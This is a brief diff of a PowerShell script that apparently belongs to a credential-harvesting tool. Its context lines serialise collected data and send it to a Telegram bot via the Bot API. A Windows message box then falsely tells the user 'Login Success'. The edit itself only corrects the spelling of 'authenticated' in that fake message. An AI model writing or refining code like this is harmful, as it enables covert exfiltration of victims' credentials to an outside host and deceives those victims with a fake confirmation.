@@ -10,4 +10,4 @@ $json_msg = $data | ConvertTo-Json
 $uri = 'https://api.telegram.org/bot' + $bot_token + '/sendMessage?chat_id=' + $message_FromID + '&parse_mode=HTML&text=' + $json_msg
 Invoke-WebRequest -uri  $uri -UseBasicParsing | Out-Null
 [System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null
-[System.Windows.Forms.MessageBox]::Show('Your account was succesfully autenticated.','Login Success')
+[System.Windows.Forms.MessageBox]::Show('Your account was succesfully authenticated.','Login Success')
